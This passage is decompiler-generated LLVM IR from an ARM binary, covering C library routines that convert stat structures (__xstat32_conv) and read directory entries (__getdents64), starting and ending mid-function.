  %v4_16614 = call i32 @__GI_memset(i8* %v3_16614, i32 0, i32 104)
  %v2_16618 = load i32, i32* %arg1, align 4
  store i32 %v2_16618, i32* %r3.global-to-local, align 4
  %v3_16618 = add i32 %tmp, 4
  %v4_16618 = inttoptr i32 %v3_16618 to i32*
  %v5_16618 = load i32, i32* %v4_16618, align 4
  store i32 %v5_16618, i32* %r4.global-to-local, align 4
  %v0_1661c = load i32, i32* %r5.global-to-local, align 4
  %v1_1661c = inttoptr i32 %v0_1661c to i32*
  store i32 %v2_16618, i32* %v1_1661c, align 4
  %v3_1661c = add i32 %v0_1661c, 4
  %v4_1661c = inttoptr i32 %v3_1661c to i32*
  %v5_1661c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1661c, i32* %v4_1661c, align 4
  %v0_16620 = load i32, i32* %r6.global-to-local, align 4
  %v1_16620 = add i32 %v0_16620, 12
  %v2_16620 = inttoptr i32 %v1_16620 to i32*
  %v3_16620 = load i32, i32* %v2_16620, align 4
  %v1_16624 = load i32, i32* %r5.global-to-local, align 4
  %v2_16624 = add i32 %v1_16624, 12
  %v3_16624 = inttoptr i32 %v2_16624 to i32*
  store i32 %v3_16620, i32* %v3_16624, align 4
  %v0_16628 = load i32, i32* %r6.global-to-local, align 4
  %v1_16628 = add i32 %v0_16628, 96
  store i32 %v1_16628, i32* %r3.global-to-local, align 4
  %v1_1662c = inttoptr i32 %v1_16628 to i32*
  %v2_1662c = load i32, i32* %v1_1662c, align 4
  store i32 %v2_1662c, i32* %r3.global-to-local, align 4
  %v3_1662c = add i32 %v0_16628, 100
  %v4_1662c = inttoptr i32 %v3_1662c to i32*
  %v5_1662c = load i32, i32* %v4_1662c, align 4
  store i32 %v5_1662c, i32* %r4.global-to-local, align 4
  %v1_16630 = add i32 %v0_16628, 56
  %v2_16630 = inttoptr i32 %v1_16630 to i32*
  %v3_16630 = load i32, i32* %v2_16630, align 4
  store i32 %v3_16630, i32* %r2.global-to-local, align 4
  %v1_16634 = load i32, i32* %r5.global-to-local, align 4
  %v2_16634 = add i32 %v1_16634, 96
  %v3_16634 = inttoptr i32 %v2_16634 to i32*
  store i32 %v2_1662c, i32* %v3_16634, align 4
  %v0_16638 = load i32, i32* %r4.global-to-local, align 4
  %v1_16638 = load i32, i32* %r5.global-to-local, align 4
  %v2_16638 = add i32 %v1_16638, 100
  %v3_16638 = inttoptr i32 %v2_16638 to i32*
  store i32 %v0_16638, i32* %v3_16638, align 4
  %v0_1663c = load i32, i32* %r6.global-to-local, align 4
  %v1_1663c = add i32 %v0_1663c, 24
  store i32 %v1_1663c, i32* %ip.global-to-local, align 4
  %v1_16640 = inttoptr i32 %v1_1663c to i32*
  %v2_16640 = load i32, i32* %v1_16640, align 4
  store i32 %v2_16640, i32* %ip.global-to-local, align 4
  %v3_16640 = add i32 %v0_1663c, 28
  %v4_16640 = inttoptr i32 %v3_16640 to i32*
  %v5_16640 = load i32, i32* %v4_16640, align 4
  store i32 %v5_16640, i32* %lr.global-to-local, align 4
  %v0_16644 = load i32, i32* %r2.global-to-local, align 4
  %v1_16644 = load i32, i32* %r5.global-to-local, align 4
  %v2_16644 = add i32 %v1_16644, 56
  %v3_16644 = inttoptr i32 %v2_16644 to i32*
  store i32 %v0_16644, i32* %v3_16644, align 4
  %v0_16648 = load i32, i32* %r6.global-to-local, align 4
  %v1_16648 = add i32 %v0_16648, 72
  store i32 %v1_16648, i32* %r3.global-to-local, align 4
  %v1_1664c = add i32 %v0_16648, 32
  store i32 %v1_1664c, i32* %r7.global-to-local, align 4
  %v1_16650 = inttoptr i32 %v1_1664c to i32*
  %v2_16650 = load i32, i32* %v1_16650, align 4
  store i32 %v2_16650, i32* %r7.global-to-local, align 4
  %v3_16650 = add i32 %v0_16648, 36
  %v4_16650 = inttoptr i32 %v3_16650 to i32*
  %v5_16650 = load i32, i32* %v4_16650, align 4
  store i32 %v5_16650, i32* %r8.global-to-local, align 4
  %v1_16654 = inttoptr i32 %v1_16648 to i32*
  %v2_16654 = load i32, i32* %v1_16654, align 4
  %v3_16654 = add i32 %v0_16648, 76
  %v4_16654 = inttoptr i32 %v3_16654 to i32*
  %v5_16654 = load i32, i32* %v4_16654, align 4
  store i32 %v5_16654, i32* %r1.global-to-local, align 4
  %v0_16658 = load i32, i32* %r5.global-to-local, align 4
  %v1_16658 = add i32 %v0_16658, 72
  %v1_1665c = inttoptr i32 %v1_16658 to i32*
  store i32 %v2_16654, i32* %v1_1665c, align 4
  %v3_1665c = add i32 %v0_16658, 76
  %v4_1665c = inttoptr i32 %v3_1665c to i32*
  %v5_1665c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1665c, i32* %v4_1665c, align 4
  %v0_16660 = load i32, i32* %r7.global-to-local, align 4
  %v1_16660 = load i32, i32* %r5.global-to-local, align 4
  %v2_16660 = add i32 %v1_16660, 32
  %v3_16660 = inttoptr i32 %v2_16660 to i32*
  store i32 %v0_16660, i32* %v3_16660, align 4
  %v0_16664 = load i32, i32* %r8.global-to-local, align 4
  %v1_16664 = load i32, i32* %r5.global-to-local, align 4
  %v2_16664 = add i32 %v1_16664, 36
  %v3_16664 = inttoptr i32 %v2_16664 to i32*
  store i32 %v0_16664, i32* %v3_16664, align 4
  %v0_16668 = load i32, i32* %r6.global-to-local, align 4
  %v1_16668 = add i32 %v0_16668, 80
  store i32 %v1_16668, i32* %r3.global-to-local, align 4
  %v1_1666c = add i32 %v0_16668, 48
  store i32 %v1_1666c, i32* %r7.global-to-local, align 4
  %v1_16670 = inttoptr i32 %v1_1666c to i32*
  %v2_16670 = load i32, i32* %v1_16670, align 4
  store i32 %v2_16670, i32* %r7.global-to-local, align 4
  %v3_16670 = add i32 %v0_16668, 52
  %v4_16670 = inttoptr i32 %v3_16670 to i32*
  %v5_16670 = load i32, i32* %v4_16670, align 4
  store i32 %v5_16670, i32* %r8.global-to-local, align 4
  %v1_16674 = inttoptr i32 %v1_16668 to i32*
  %v2_16674 = load i32, i32* %v1_16674, align 4
  %v3_16674 = add i32 %v0_16668, 84
  %v4_16674 = inttoptr i32 %v3_16674 to i32*
  %v5_16674 = load i32, i32* %v4_16674, align 4
  store i32 %v5_16674, i32* %r1.global-to-local, align 4
  %v1_16678 = add i32 %v0_16668, 16
  %v2_16678 = inttoptr i32 %v1_16678 to i32*
  %v3_16678 = load i32, i32* %v2_16678, align 4
  store i32 %v3_16678, i32* %r2.global-to-local, align 4
  %v0_1667c = load i32, i32* %r5.global-to-local, align 4
  %v1_1667c = add i32 %v0_1667c, 80
  %v1_16680 = inttoptr i32 %v1_1667c to i32*
  store i32 %v2_16674, i32* %v1_16680, align 4
  %v3_16680 = add i32 %v0_1667c, 84
  %v4_16680 = inttoptr i32 %v3_16680 to i32*
  %v5_16680 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16680, i32* %v4_16680, align 4
  %v0_16684 = load i32, i32* %r7.global-to-local, align 4
  %v1_16684 = load i32, i32* %r5.global-to-local, align 4
  %v2_16684 = add i32 %v1_16684, 48
  %v3_16684 = inttoptr i32 %v2_16684 to i32*
  store i32 %v0_16684, i32* %v3_16684, align 4
  %v0_16688 = load i32, i32* %r8.global-to-local, align 4
  %v1_16688 = load i32, i32* %r5.global-to-local, align 4
  %v2_16688 = add i32 %v1_16688, 52
  %v3_16688 = inttoptr i32 %v2_16688 to i32*
  store i32 %v0_16688, i32* %v3_16688, align 4
  %v0_1668c = load i32, i32* %r2.global-to-local, align 4
  %v1_1668c = load i32, i32* %r5.global-to-local, align 4
  %v2_1668c = add i32 %v1_1668c, 16
  %v3_1668c = inttoptr i32 %v2_1668c to i32*
  store i32 %v0_1668c, i32* %v3_1668c, align 4
  %v0_16690 = load i32, i32* %r6.global-to-local, align 4
  %v1_16690 = add i32 %v0_16690, 88
  store i32 %v1_16690, i32* %r3.global-to-local, align 4
  %v1_16694 = add i32 %v0_16690, 20
  %v2_16694 = inttoptr i32 %v1_16694 to i32*
  %v3_16694 = load i32, i32* %v2_16694, align 4
  store i32 %v3_16694, i32* %r2.global-to-local, align 4
  %v1_16698 = inttoptr i32 %v1_16690 to i32*
  %v2_16698 = load i32, i32* %v1_16698, align 4
  %v3_16698 = add i32 %v0_16690, 92
  %v4_16698 = inttoptr i32 %v3_16698 to i32*
  %v5_16698 = load i32, i32* %v4_16698, align 4
  store i32 %v5_16698, i32* %r1.global-to-local, align 4
  %v1_1669c = add i32 %v0_16690, 64
  store i32 %v1_1669c, i32* %r6.global-to-local, align 4
  %v1_166a0 = inttoptr i32 %v1_1669c to i32*
  %v2_166a0 = load i32, i32* %v1_166a0, align 4
  store i32 %v2_166a0, i32* %r6.global-to-local, align 4
  %v3_166a0 = add i32 %v0_16690, 68
  %v4_166a0 = inttoptr i32 %v3_166a0 to i32*
  %v5_166a0 = load i32, i32* %v4_166a0, align 4
  store i32 %v5_166a0, i32* %r7.global-to-local, align 4
  %v0_166a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_166a4 = add i32 %v0_166a4, 88
  store i32 %v1_166a4, i32* %r3.global-to-local, align 4
  %v2_166a8 = add i32 %v0_166a4, 20
  %v3_166a8 = inttoptr i32 %v2_166a8 to i32*
  store i32 %v3_16694, i32* %v3_166a8, align 4
  %v0_166ac = load i32, i32* %ip.global-to-local, align 4
  %v1_166ac = load i32, i32* %r5.global-to-local, align 4
  %v2_166ac = add i32 %v1_166ac, 24
  %v3_166ac = inttoptr i32 %v2_166ac to i32*
  store i32 %v0_166ac, i32* %v3_166ac, align 4
  %v0_166b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_166b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_166b0 = add i32 %v1_166b0, 28
  %v3_166b0 = inttoptr i32 %v2_166b0 to i32*
  store i32 %v0_166b0, i32* %v3_166b0, align 4
  %v0_166b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_166b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_166b4 = add i32 %v1_166b4, 64
  %v3_166b4 = inttoptr i32 %v2_166b4 to i32*
  store i32 %v0_166b4, i32* %v3_166b4, align 4
  %v0_166b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_166b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_166b8 = add i32 %v1_166b8, 68
  %v3_166b8 = inttoptr i32 %v2_166b8 to i32*
  store i32 %v0_166b8, i32* %v3_166b8, align 4
  %v0_166bc = load i32, i32* %r3.global-to-local, align 4
  %v1_166bc = inttoptr i32 %v0_166bc to i32*
  store i32 %v2_16698, i32* %v1_166bc, align 4
  %v3_166bc = add i32 %v0_166bc, 4
  %v4_166bc = inttoptr i32 %v3_166bc to i32*
  %v5_166bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_166bc, i32* %v4_166bc, align 4
  %v2_166c0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_166c0, i32* %r4.global-to-local, align 4
  ret i32 %v2_16698

; uselistorder directives
  uselistorder i32 %v0_16690, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_16668, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 104, { 0, 4, 1, 2, 6, 3, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_166c8 = load i32, i32* @r4, align 4
  store i32 %v3_166c8, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_166e0 = inttoptr i32 %arg2 to i8*
  %v4_166e0 = call i32 @__GI_memset(i8* %v3_166e0, i32 0, i32 88)
  %v2_166e4 = load i32, i32* %arg1, align 4
  %v3_166e4 = add i32 %tmp, 4
  %v4_166e4 = inttoptr i32 %v3_166e4 to i32*
  %v5_166e4 = load i32, i32* %v4_166e4, align 4
  store i32 %v5_166e4, i32* %r4.global-to-local, align 4
  %v0_166e8 = load i32, i32* %r6.global-to-local, align 4
  %v1_166e8 = inttoptr i32 %v0_166e8 to i32*
  store i32 %v2_166e4, i32* %v1_166e8, align 4
  %v3_166e8 = add i32 %v0_166e8, 4
  %v4_166e8 = inttoptr i32 %v3_166e8 to i32*
  %v5_166e8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_166e8, i32* %v4_166e8, align 4
  %v0_166ec = load i32, i32* %r5.global-to-local, align 4
  %v1_166ec = add i32 %v0_166ec, 32
  %v1_166f0 = inttoptr i32 %v1_166ec to i32*
  %v2_166f0 = load i32, i32* %v1_166f0, align 4
  %v3_166f0 = add i32 %v0_166ec, 36
  %v4_166f0 = inttoptr i32 %v3_166f0 to i32*
  %v5_166f0 = load i32, i32* %v4_166f0, align 4
  store i32 %v5_166f0, i32* %r4.global-to-local, align 4
  %v1_166f4 = add i32 %v0_166ec, 96
  %v2_166f4 = inttoptr i32 %v1_166f4 to i32*
  %v3_166f4 = load i32, i32* %v2_166f4, align 4
  store i32 %v3_166f4, i32* %r2.global-to-local, align 4
  %v1_166f8 = load i32, i32* %r6.global-to-local, align 4
  %v2_166f8 = add i32 %v1_166f8, 32
  %v3_166f8 = inttoptr i32 %v2_166f8 to i32*
  store i32 %v2_166f0, i32* %v3_166f8, align 4
  %v0_166fc = load i32, i32* %r4.global-to-local, align 4
  %v1_166fc = load i32, i32* %r6.global-to-local, align 4
  %v2_166fc = add i32 %v1_166fc, 36
  %v3_166fc = inttoptr i32 %v2_166fc to i32*
  store i32 %v0_166fc, i32* %v3_166fc, align 4
  %v0_16700 = load i32, i32* %r2.global-to-local, align 4
  %v1_16700 = load i32, i32* %r6.global-to-local, align 4
  %v2_16700 = add i32 %v1_16700, 12
  %v3_16700 = inttoptr i32 %v2_16700 to i32*
  store i32 %v0_16700, i32* %v3_16700, align 4
  %v0_16704 = load i32, i32* %r5.global-to-local, align 4
  %v1_16704 = add i32 %v0_16704, 48
  %v2_16704 = inttoptr i32 %v1_16704 to i32*
  %v3_16704 = load i32, i32* %v2_16704, align 4
  %v1_16708 = add i32 %v0_16704, 24
  store i32 %v1_16708, i32* %ip.global-to-local, align 4
  %v1_1670c = inttoptr i32 %v1_16708 to i32*
  %v2_1670c = load i32, i32* %v1_1670c, align 4
  store i32 %v2_1670c, i32* %ip.global-to-local, align 4
  %v3_1670c = add i32 %v0_16704, 28
  %v4_1670c = inttoptr i32 %v3_1670c to i32*
  %v5_1670c = load i32, i32* %v4_1670c, align 4
  store i32 %v5_1670c, i32* %lr.global-to-local, align 4
  %v1_16710 = load i32, i32* %r6.global-to-local, align 4
  %v2_16710 = add i32 %v1_16710, 44
  %v3_16710 = inttoptr i32 %v2_16710 to i32*
  store i32 %v3_16704, i32* %v3_16710, align 4
  %v0_16714 = load i32, i32* %r5.global-to-local, align 4
  %v1_16714 = add i32 %v0_16714, 64
  %v2_16714 = inttoptr i32 %v1_16714 to i32*
  %v3_16714 = load i32, i32* %v2_16714, align 4
  %v1_16718 = add i32 %v0_16714, 56
  %v2_16718 = inttoptr i32 %v1_16718 to i32*
  %v3_16718 = load i32, i32* %v2_16718, align 4
  store i32 %v3_16718, i32* %r2.global-to-local, align 4
  %v1_1671c = load i32, i32* %r6.global-to-local, align 4
  %v2_1671c = add i32 %v1_1671c, 52
  %v3_1671c = inttoptr i32 %v2_1671c to i32*
  store i32 %v3_16714, i32* %v3_1671c, align 4
  %v0_16720 = load i32, i32* %r2.global-to-local, align 4
  %v1_16720 = load i32, i32* %r6.global-to-local, align 4
  %v2_16720 = add i32 %v1_16720, 48
  %v3_16720 = inttoptr i32 %v2_16720 to i32*
  store i32 %v0_16720, i32* %v3_16720, align 4
  %v0_16724 = load i32, i32* %r5.global-to-local, align 4
  %v1_16724 = add i32 %v0_16724, 72
  %v1_16728 = inttoptr i32 %v1_16724 to i32*
  %v2_16728 = load i32, i32* %v1_16728, align 4
  %v3_16728 = add i32 %v0_16724, 76
  %v4_16728 = inttoptr i32 %v3_16728 to i32*
  %v5_16728 = load i32, i32* %v4_16728, align 4
  store i32 %v5_16728, i32* %r1.global-to-local, align 4
  %v0_1672c = load i32, i32* %r6.global-to-local, align 4
  %v1_1672c = add i32 %v0_1672c, 56
  %v1_16730 = inttoptr i32 %v1_1672c to i32*
  store i32 %v2_16728, i32* %v1_16730, align 4
  %v3_16730 = add i32 %v0_1672c, 60
  %v4_16730 = inttoptr i32 %v3_16730 to i32*
  %v5_16730 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16730, i32* %v4_16730, align 4
  %v0_16734 = load i32, i32* %r5.global-to-local, align 4
  %v1_16734 = add i32 %v0_16734, 80
  %v1_16738 = inttoptr i32 %v1_16734 to i32*
  %v2_16738 = load i32, i32* %v1_16738, align 4
  %v3_16738 = add i32 %v0_16734, 84
  %v4_16738 = inttoptr i32 %v3_16738 to i32*
  %v5_16738 = load i32, i32* %v4_16738, align 4
  store i32 %v5_16738, i32* %r1.global-to-local, align 4
  %v0_1673c = load i32, i32* %r6.global-to-local, align 4
  %v1_1673c = add i32 %v0_1673c, 64
  %v1_16740 = inttoptr i32 %v1_1673c to i32*
  store i32 %v2_16738, i32* %v1_16740, align 4
  %v3_16740 = add i32 %v0_1673c, 68
  %v4_16740 = inttoptr i32 %v3_16740 to i32*
  %v5_16740 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16740, i32* %v4_16740, align 4
  %v0_16744 = load i32, i32* %r5.global-to-local, align 4
  %v1_16744 = add i32 %v0_16744, 16
  %v2_16744 = inttoptr i32 %v1_16744 to i32*
  %v3_16744 = load i32, i32* %v2_16744, align 4
  %v1_16748 = load i32, i32* %r6.global-to-local, align 4
  %v2_16748 = add i32 %v1_16748, 16
  %v3_16748 = inttoptr i32 %v2_16748 to i32*
  store i32 %v3_16744, i32* %v3_16748, align 4
  %v0_1674c = load i32, i32* %r5.global-to-local, align 4
  %v1_1674c = add i32 %v0_1674c, 88
  %v1_16750 = add i32 %v0_1674c, 20
  %v2_16750 = inttoptr i32 %v1_16750 to i32*
  %v3_16750 = load i32, i32* %v2_16750, align 4
  store i32 %v3_16750, i32* %r2.global-to-local, align 4
  %v1_16754 = inttoptr i32 %v1_1674c to i32*
  %v2_16754 = load i32, i32* %v1_16754, align 4
  %v3_16754 = add i32 %v0_1674c, 92
  %v4_16754 = inttoptr i32 %v3_16754 to i32*
  %v5_16754 = load i32, i32* %v4_16754, align 4
  store i32 %v5_16754, i32* %r1.global-to-local, align 4
  %v0_16758 = load i32, i32* %r6.global-to-local, align 4
  %v1_16758 = add i32 %v0_16758, 72
  %v1_1675c = inttoptr i32 %v1_16758 to i32*
  store i32 %v2_16754, i32* %v1_1675c, align 4
  %v3_1675c = add i32 %v0_16758, 76
  %v4_1675c = inttoptr i32 %v3_1675c to i32*
  %v5_1675c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1675c, i32* %v4_1675c, align 4
  %v0_16760 = load i32, i32* %r2.global-to-local, align 4
  %v1_16760 = load i32, i32* %r6.global-to-local, align 4
  %v2_16760 = add i32 %v1_16760, 20
  %v3_16760 = inttoptr i32 %v2_16760 to i32*
  store i32 %v0_16760, i32* %v3_16760, align 4
  %v0_16764 = load i32, i32* %ip.global-to-local, align 4
  %v1_16764 = load i32, i32* %r6.global-to-local, align 4
  %v2_16764 = add i32 %v1_16764, 24
  %v3_16764 = inttoptr i32 %v2_16764 to i32*
  store i32 %v0_16764, i32* %v3_16764, align 4
  %v0_16768 = load i32, i32* %lr.global-to-local, align 4
  %v1_16768 = load i32, i32* %r6.global-to-local, align 4
  %v2_16768 = add i32 %v1_16768, 28
  %v3_16768 = inttoptr i32 %v2_16768 to i32*
  store i32 %v0_16768, i32* %v3_16768, align 4
  %v2_1676c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1676c, i32* %r4.global-to-local, align 4
  ret i32 %v2_16754

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 84, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 96, { 4, 2, 3, 0, 1, 5, 6 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 5, 0, 1, 2, 3, 4, 8, 7, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_16778 = load i32, i32* @r5, align 4
  %v12_16778 = load i32, i32* @r7, align 4
  %v1_1677c = add i32 %arg3, 14
  %v2_16784 = ptrtoint i32* %stack_var_-72 to i32
  %v1_16788 = and i32 %v1_1677c, -8
  %v2_1678c = sub i32 %v2_16784, %v1_16788
  %v1_16790 = add i32 %v2_1678c, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_167d4, label %dec_label_pc_167b8

dec_label_pc_167b8:                               ; preds = %entry
  %v1_167bc = sub i32 0, %arg1
  %v3_167c0 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_167c0 = sext i16 %v3_167c0 to i32
  %v0_167c4 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_167cc = add i32 %v4_167c0, %v0_167c4
  %v4_167cc = inttoptr i32 %v3_167cc to i32*
  store i32 %v1_167bc, i32* %v4_167cc, align 4
  br label %dec_label_pc_168a4

dec_label_pc_167d4:                               ; preds = %entry
  br i1 false, label %dec_label_pc_168a4, label %dec_label_pc_167dc

dec_label_pc_167dc:                               ; preds = %dec_label_pc_167d4
  %v2_167dc = add i32 %v1_16790, %arg1
  store i32 %v2_167dc, i32* %r1.global-to-local, align 4
  %v2_167e0 = add i32 %tmp, %arg3
  store i32 %v1_16790, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1688c

dec_label_pc_167fc:                               ; preds = %dec_label_pc_1688c
  %v1_167fc = add i32 %v0_1685c, 16
  %v2_167fc = inttoptr i32 %v1_167fc to i16*
  %v3_167fc = load i16, i16* %v2_167fc, align 2
  %v4_167fc = zext i16 %v3_167fc to i32
  %v1_16800 = add nsw i32 %v4_167fc, -19
  store i32 %v1_16800, i32* @r2, align 4
  %v1_16804 = add nuw nsw i32 %v4_167fc, 7
  %v1_16808 = and i32 %v1_16804, 131064
  store i32 %v1_16808, i32* @ip, align 4
  %v2_16810 = add i32 %v1_16808, %v0_16864
  store i32 %v2_16810, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_16810, %v2_167e0
  br i1 %tmp24, label %dec_label_pc_1681c, label %dec_label_pc_16858

dec_label_pc_1681c:                               ; preds = %dec_label_pc_167fc
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_16824 = load i32, i32* %r8.global-to-local, align 4
  %v0_16828 = load i32, i32* %sb.global-to-local, align 4
  %v1_1682c = load i32, i32* @sp, align 4
  %v2_1682c = inttoptr i32 %v1_1682c to i32*
  store i32 0, i32* %v2_1682c, align 4
  %v4_16830 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_16824, i32 %v0_16828)
  %v0_16834 = load i32, i32* @r5, align 4
  %v1_16834 = load i32, i32* %sl.global-to-local, align 4
  %v9_16834 = icmp eq i32 %v0_16834, %v1_16834
  br i1 %v9_16834, label %dec_label_pc_1683c, label %dec_label_pc_168a0

dec_label_pc_1683c:                               ; preds = %dec_label_pc_1681c
  %v0_16840 = call i32 @__aeabi_read_tp()
  %v3_16844 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_16844 = sext i16 %v3_16844 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_16850 = add i32 %v4_16844, %v0_16840
  %v4_16850 = inttoptr i32 %v3_16850 to i32*
  store i32 22, i32* %v4_16850, align 4
  br label %dec_label_pc_168a4

dec_label_pc_16858:                               ; preds = %dec_label_pc_167fc
  %v1_16858 = inttoptr i32 %v0_1685c to i32*
  %v2_16858 = load i32, i32* %v1_16858, align 4
  %v3_16858 = add i32 %v0_1685c, 4
  %v4_16858 = inttoptr i32 %v3_16858 to i32*
  %v5_16858 = load i32, i32* %v4_16858, align 4
  store i32 %v5_16858, i32* @r4, align 4
  %v1_1685c = add i32 %v0_1685c, 8
  store i32 %v1_1685c, i32* %r8.global-to-local, align 4
  %v1_16860 = inttoptr i32 %v1_1685c to i32*
  %v2_16860 = load i32, i32* %v1_16860, align 4
  store i32 %v2_16860, i32* %r8.global-to-local, align 4
  %v3_16860 = add i32 %v0_1685c, 12
  %v4_16860 = inttoptr i32 %v3_16860 to i32*
  %v5_16860 = load i32, i32* %v4_16860, align 4
  store i32 %v5_16860, i32* %sb.global-to-local, align 4
  %v1_16864 = inttoptr i32 %v0_16864 to i32*
  store i32 %v2_16858, i32* %v1_16864, align 4
  %v3_16864 = add i32 %v0_16864, 4
  %v4_16864 = inttoptr i32 %v3_16864 to i32*
  %v5_16864 = load i32, i32* @r4, align 4
  store i32 %v5_16864, i32* %v4_16864, align 4
  %v0_16868 = load i32, i32* %r8.global-to-local, align 4
  %v1_16868 = load i32, i32* @r5, align 4
  %v2_16868 = add i32 %v1_16868, 8
  %v3_16868 = inttoptr i32 %v2_16868 to i32*
  store i32 %v0_16868, i32* %v3_16868, align 4
  %v0_1686c = load i32, i32* %sb.global-to-local, align 4
  %v1_1686c = load i32, i32* @r5, align 4
  %v2_1686c = add i32 %v1_1686c, 12
  %v3_1686c = inttoptr i32 %v2_1686c to i32*
  store i32 %v0_1686c, i32* %v3_1686c, align 4
  %v0_16870 = load i32, i32* @ip, align 4
  %v1_16870 = trunc i32 %v0_16870 to i16
  %v2_16870 = load i32, i32* @r5, align 4
  %v3_16870 = add i32 %v2_16870, 16
  %v4_16870 = inttoptr i32 %v3_16870 to i16*
  store i16 %v1_16870, i16* %v4_16870, align 2
  %v0_16874 = load i32, i32* @r7, align 4
  %v1_16874 = add i32 %v0_16874, 18
  %v2_16874 = inttoptr i32 %v1_16874 to i8*
  %v3_16874 = load i8, i8* %v2_16874, align 1
  %v4_16874 = zext i8 %v3_16874 to i32
  store i32 %v4_16874, i32* @r3, align 4
  %v2_16878 = load i32, i32* @r5, align 4
  %v3_16878 = add i32 %v2_16878, 18
  %v4_16878 = inttoptr i32 %v3_16878 to i8*
  store i8 %v3_16874, i8* %v4_16878, align 1
  %v0_1687c = call i32 @memcpy()
  %v0_16880 = load i32, i32* @r7, align 4
  %v1_16880 = add i32 %v0_16880, 16
  %v2_16880 = inttoptr i32 %v1_16880 to i16*
  %v3_16880 = load i16, i16* %v2_16880, align 2
  %v4_16880 = zext i16 %v3_16880 to i32
  %v0_16884 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16884, i32* @r5, align 4
  %v2_16888 = add i32 %v4_16880, %v0_16880
  store i32 %v2_16888, i32* @r7, align 4
  br label %dec_label_pc_1688c

dec_label_pc_1688c:                               ; preds = %dec_label_pc_167dc, %dec_label_pc_16858
  %v0_16864 = phi i32 [ %tmp, %dec_label_pc_167dc ], [ %v0_16884, %dec_label_pc_16858 ]
  %v0_1685c = phi i32 [ %v1_16790, %dec_label_pc_167dc ], [ %v2_16888, %dec_label_pc_16858 ]
  %v3_16890 = icmp ult i32 %v0_1685c, %v2_167dc
  %v1_16894 = add i32 %v0_16864, 19
  store i32 %v1_16894, i32* @r0, align 4
  %v1_16898 = add i32 %v0_1685c, 19
  store i32 %v1_16898, i32* @r1, align 4
  br i1 %v3_16890, label %dec_label_pc_167fc, label %dec_label_pc_168a0.loopexit

dec_label_pc_168a0.loopexit:                      ; preds = %dec_label_pc_1688c
  %v0_168a0.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_168a0

dec_label_pc_168a0:                               ; preds = %dec_label_pc_168a0.loopexit, %dec_label_pc_1681c
  %v1_168a0 = phi i32 [ %v0_16864, %dec_label_pc_168a0.loopexit ], [ %v0_16834, %dec_label_pc_1681c ]
  %v0_168a0 = phi i32 [ %v0_168a0.pre, %dec_label_pc_168a0.loopexit ], [ %v1_16834, %dec_label_pc_1681c ]
  %v2_168a0 = sub i32 %v1_168a0, %v0_168a0
  store i32 %v2_168a0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_168a4

